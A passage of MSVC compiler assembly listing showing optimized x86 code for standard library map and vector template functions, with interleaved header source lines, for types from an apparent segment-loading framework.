;	COMDAT ??0?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@QAE@ABU?$less@PBD@1@@Z
_TEXT	SEGMENT
__Parg$dead$ = 8					; size = 4
??0?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@QAE@ABU?$less@PBD@1@@Z PROC ; std::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >, COMDAT
; _this$ = ecx

; 880  :     _Tree(const key_compare& _Parg) : _Mypair(_One_then_variadic_args_t(), _Parg, _Zero_then_variadic_args_t()) {

  00000	56		 push	 esi
  00001	8b f1		 mov	 esi, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  00003	6a 20		 push	 32			; 00000020H
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00005	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
  0000b	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  00012	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  00017	83 c4 04	 add	 esp, 4
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 344  :         _Construct_in_place(_Pnode->_Left, _Pnode);

  0001a	89 00		 mov	 DWORD PTR [eax], eax

; 345  :         _Construct_in_place(_Pnode->_Parent, _Pnode);

  0001c	89 40 04	 mov	 DWORD PTR [eax+4], eax

; 346  :         _Construct_in_place(_Pnode->_Right, _Pnode);

  0001f	89 40 08	 mov	 DWORD PTR [eax+8], eax

; 347  :         _Pnode->_Color = _Black;

  00022	66 c7 40 0c 01
	01		 mov	 WORD PTR [eax+12], 257	; 00000101H

; 2024 :         _Scary->_Myhead = _Node::_Buyheadnode(_Getal());

  00028	89 06		 mov	 DWORD PTR [esi], eax

; 881  :         _Alloc_sentinel_and_proxy();
; 882  :     }

  0002a	8b c6		 mov	 eax, esi
  0002c	5e		 pop	 esi
  0002d	c2 04 00	 ret	 4
??0?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@QAE@ABU?$less@PBD@1@@Z ENDP ; std::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QBEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ
_TEXT	SEGMENT
?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QBEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ PROC ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Get_first, COMDAT
; _this$ = ecx

; 1340 :         return *this;

  00000	8b c1		 mov	 eax, ecx

; 1341 :     }

  00002	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QBEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ENDP ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ
_TEXT	SEGMENT
?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Getal, COMDAT
; _this$ = ecx

; 1732 :         return _Mypair._Get_first();

  00000	8b c1		 mov	 eax, ecx

; 1733 :     }

  00002	c3		 ret	 0
?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Destroy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPAURelocatedNetVar@SegmentFramework@@0@Z
_TEXT	SEGMENT
__First$dead$ = 8					; size = 4
__Last$dead$ = 12					; size = 4
?_Destroy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPAURelocatedNetVar@SegmentFramework@@0@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Destroy, COMDAT
; _this$dead$ = ecx

; 1612 :         _Destroy_range(_First, _Last, _Getal());
; 1613 :     }

  00000	c2 08 00	 ret	 8
?_Destroy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPAURelocatedNetVar@SegmentFramework@@0@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Destroy
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?allocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEPAURelocatedNetVar@SegmentFramework@@I@Z
_TEXT	SEGMENT
__Count$ = 8						; size = 4
?allocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEPAURelocatedNetVar@SegmentFramework@@I@Z PROC ; std::allocator<SegmentFramework::RelocatedNetVar>::allocate, COMDAT
; _this$dead$ = ecx

; 783  :     _NODISCARD _DECLSPEC_ALLOCATOR _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 34   :             if (_Count > _Max_possible) {

  00003	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	3d ff ff ff 1f	 cmp	 eax, 536870911		; 1fffffffH
  0000b	77 4a		 ja	 SHORT $LN27@allocate

; 35   :                 _Throw_bad_array_new_length(); // multiply overflow
; 36   :             }
; 37   :         }
; 38   : 
; 39   :     return _Count * _Ty_size;

  0000d	c1 e0 03	 shl	 eax, 3

; 174  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00010	3d 00 10 00 00	 cmp	 eax, 4096		; 00001000H
  00015	72 29		 jb	 SHORT $LN8@allocate

; 89   :     const size_t _Block_size = _Non_user_size + _Bytes;

  00017	8d 48 23	 lea	 ecx, DWORD PTR [eax+35]

; 90   :     if (_Block_size <= _Bytes) {

  0001a	3b c8		 cmp	 ecx, eax
  0001c	76 39		 jbe	 SHORT $LN27@allocate

; 51   :         return ::operator new(_Bytes);

  0001e	51		 push	 ecx
  0001f	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new

; 94   :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  00024	8b c8		 mov	 ecx, eax

; 51   :         return ::operator new(_Bytes);

  00026	83 c4 04	 add	 esp, 4

; 95   :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00029	85 c9		 test	 ecx, ecx
  0002b	74 0d		 je	 SHORT $LN17@allocate

; 96   :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  0002d	8d 41 23	 lea	 eax, DWORD PTR [ecx+35]
  00030	83 e0 e0	 and	 eax, -32		; ffffffe0H

; 97   :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00033	89 48 fc	 mov	 DWORD PTR [eax-4], ecx

; 784  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 785  :     }

  00036	5d		 pop	 ebp
  00037	c2 04 00	 ret	 4
$LN17@allocate:

; 95   :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0003a	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN8@allocate:

; 179  :     if (_Bytes != 0) {

  00040	85 c0		 test	 eax, eax
  00042	74 0d		 je	 SHORT $LN9@allocate

; 51   :         return ::operator new(_Bytes);

  00044	50		 push	 eax
  00045	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  0004a	83 c4 04	 add	 esp, 4

; 784  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 785  :     }

  0004d	5d		 pop	 ebp
  0004e	c2 04 00	 ret	 4
$LN9@allocate:

; 183  :     return nullptr;

  00051	33 c0		 xor	 eax, eax

; 784  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 785  :     }

  00053	5d		 pop	 ebp
  00054	c2 04 00	 ret	 4
$LN27@allocate:

; 91   :         _Throw_bad_array_new_length(); // add overflow

  00057	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN28@allocate:
  0005c	cc		 int	 3
?allocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEPAURelocatedNetVar@SegmentFramework@@I@Z ENDP ; std::allocator<SegmentFramework::RelocatedNetVar>::allocate
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?deallocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEXQAURelocatedNetVar@SegmentFramework@@I@Z
_TEXT	SEGMENT
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
?deallocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEXQAURelocatedNetVar@SegmentFramework@@I@Z PROC ; std::allocator<SegmentFramework::RelocatedNetVar>::deallocate, COMDAT
; _this$dead$ = ecx

; 778  :     void deallocate(_Ty* const _Ptr, const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 779  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00009	8d 14 c5 00 00
	00 00		 lea	 edx, DWORD PTR [eax*8]

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00010	81 fa 00 10 00
	00		 cmp	 edx, 4096		; 00001000H
  00016	72 14		 jb	 SHORT $LN15@deallocate

; 108  :     _Bytes += _Non_user_size;

  00018	56		 push	 esi

; 109  : 
; 110  :     const uintptr_t* const _Ptr_user = reinterpret_cast<uintptr_t*>(_Ptr);
; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00019	8b 71 fc	 mov	 esi, DWORD PTR [ecx-4]
  0001c	83 c2 23	 add	 edx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0001f	2b ce		 sub	 ecx, esi

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00021	8d 41 fc	 lea	 eax, DWORD PTR [ecx-4]
  00024	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  00027	77 11		 ja	 SHORT $LN12@deallocate

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00029	8b ce		 mov	 ecx, esi
  0002b	5e		 pop	 esi
$LN15@deallocate:

; 195  :     ::operator delete(_Ptr, _Bytes);

  0002c	52		 push	 edx
  0002d	51		 push	 ecx
  0002e	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00033	83 c4 08	 add	 esp, 8

; 781  :     }

  00036	5d		 pop	 ebp
  00037	c2 08 00	 ret	 8
$LN12@deallocate:

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0003a	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN18@deallocate:
  00040	cc		 int	 3
?deallocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEXQAURelocatedNetVar@SegmentFramework@@I@Z ENDP ; std::allocator<SegmentFramework::RelocatedNetVar>::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
;	COMDAT ?_Alloc_sentinel_and_proxy@?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@IAEXXZ
_TEXT	SEGMENT
?_Alloc_sentinel_and_proxy@?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@IAEXXZ PROC ; std::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >::_Alloc_sentinel_and_proxy, COMDAT
; _this$ = ecx

; 2020 :     void _Alloc_sentinel_and_proxy() {

  00000	56		 push	 esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  00001	6a 20		 push	 32			; 00000020H
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 2020 :     void _Alloc_sentinel_and_proxy() {

  00003	8b f1		 mov	 esi, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  00005	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  0000a	83 c4 04	 add	 esp, 4
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 344  :         _Construct_in_place(_Pnode->_Left, _Pnode);

  0000d	89 00		 mov	 DWORD PTR [eax], eax

; 345  :         _Construct_in_place(_Pnode->_Parent, _Pnode);

  0000f	89 40 04	 mov	 DWORD PTR [eax+4], eax

; 346  :         _Construct_in_place(_Pnode->_Right, _Pnode);

  00012	89 40 08	 mov	 DWORD PTR [eax+8], eax

; 347  :         _Pnode->_Color = _Black;

  00015	66 c7 40 0c 01
	01		 mov	 WORD PTR [eax+12], 257	; 00000101H

; 2021 :         const auto _Scary = _Get_scary();
; 2022 :         auto&& _Alproxy   = _GET_PROXY_ALLOCATOR(_Alnode, _Getal());
; 2023 :         _Container_proxy_ptr<_Alnode> _Proxy(_Alproxy, *_Scary);
; 2024 :         _Scary->_Myhead = _Node::_Buyheadnode(_Getal());

  0001b	89 06		 mov	 DWORD PTR [esi], eax
  0001d	5e		 pop	 esi

; 2025 :         _Proxy._Release();
; 2026 :     }

  0001e	c3		 ret	 0
?_Alloc_sentinel_and_proxy@?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@IAEXXZ ENDP ; std::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >::_Alloc_sentinel_and_proxy
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ
_TEXT	SEGMENT
?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ PROC ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Get_first, COMDAT
; _this$ = ecx

; 1336 :         return *this;

  00000	8b c1		 mov	 eax, ecx

; 1337 :     }

  00002	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ENDP ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$?0ABV?$allocator@PBD@std@@$$V@?$_Compressed_pair@V?$allocator@PBD@std@@V?$_Vector_val@U?$_Simple_types@PBD@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@PBD@1@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 1
__Val1$dead$ = 12					; size = 4
??$?0ABV?$allocator@PBD@std@@$$V@?$_Compressed_pair@V?$allocator@PBD@std@@V?$_Vector_val@U?$_Simple_types@PBD@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@PBD@1@@Z PROC ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1><std::allocator<char const *> const &>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00000	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00006	8b c1		 mov	 eax, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00008	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0
  0000f	c7 41 08 00 00
	00 00		 mov	 DWORD PTR [ecx+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00016	c2 08 00	 ret	 8
??$?0ABV?$allocator@PBD@std@@$$V@?$_Compressed_pair@V?$allocator@PBD@std@@V?$_Vector_val@U?$_Simple_types@PBD@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@PBD@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1><std::allocator<char const *> const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??$_Range_construct_or_tidy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXPBQBD0Uforward_iterator_tag@1@@Z
_TEXT	SEGMENT
_this$GSCopy$1$ = -8					; size = 4
__First$GSCopy$1$ = -4					; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
___formal$ = 16						; size = 1
??$_Range_construct_or_tidy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXPBQBD0Uforward_iterator_tag@1@@Z PROC ; std::vector<char const *,std::allocator<char const *> >::_Range_construct_or_tidy<char const * const *>, COMDAT
; _this$ = ecx

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00009	53		 push	 ebx
  0000a	8b 5d 0c	 mov	 ebx, DWORD PTR __Last$[ebp]
  0000d	56		 push	 esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  0000e	2b d8		 sub	 ebx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  00010	89 45 fc	 mov	 DWORD PTR __First$GSCopy$1$[ebp], eax
  00013	57		 push	 edi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00014	8b fb		 mov	 edi, ebx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  00016	8b f1		 mov	 esi, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00018	c1 ff 02	 sar	 edi, 2
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  0001b	89 75 f8	 mov	 DWORD PTR _this$GSCopy$1$[ebp], esi

; 492  :         const auto _Count = _Convert_size<size_type>(static_cast<size_t>(_STD distance(_First, _Last)));
; 493  :         if (_Count != 0) {

  0001e	85 ff		 test	 edi, edi
  00020	74 26		 je	 SHORT $LN21@Range_cons

; 1659 :         if (_Newcapacity > max_size()) {

  00022	81 ff ff ff ff
	3f		 cmp	 edi, 1073741823		; 3fffffffH
  00028	77 27		 ja	 SHORT $LN44@Range_cons

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  0002a	57		 push	 edi
  0002b	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00030	8b 36		 mov	 esi, DWORD PTR [esi]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

